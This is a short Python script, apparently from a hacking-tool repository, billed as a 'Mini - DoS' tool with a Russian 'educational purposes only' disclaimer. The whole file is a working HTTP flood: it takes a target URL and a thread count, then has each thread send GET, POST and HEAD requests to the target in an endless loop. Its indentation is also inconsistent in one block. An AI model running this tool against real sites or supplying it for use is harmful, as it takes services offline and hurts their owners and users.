#############################
#	Coded by Iliya-Cyber	#
#							#
#		Mini - DoS			#
#############################
#Автор кода не несет ответственность за вас. Инструмент представлен лишь в образовательных целях. Удачи ;-)
import requests
import argparse
from threading import Thread
import random
import urllib3
parser = argparse.ArgumentParser()
parser.add_argument('-1', '--url', action='store', help='Enter Url to DDoS')
parser.add_argument('-2', '--p', action='store', help='How many packets to send')
packets = int(parser.parse_args().p)
url = parser.parse_args().url
http = urllib3.PoolManager()
url1 = 'https://google.com'
try:
	resp = http.request('GET', url1)
    internet = True
except IOError:
	internet = False
#print(url)
users = ["Mozilla/5.0 (X11; U; Linux x86_64; en-Us; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"]
headers = {
	'User-Agent' : random.choice(users)
}
def send():
	while True:
		if internet == True:

			requests.get(url, headers=headers)
			print("DoS is running...")
			requests.post(url, headers=headers)
			print("DoS is running...")
			requests.head(url, headers=headers)
			print("DoS is running...")
		else:
			print("No Connection! Abort Process")
			break
if __name__ == '__main__':
	for i in range (int(packets)):
		thr = Thread(target=send)
		thr.start()
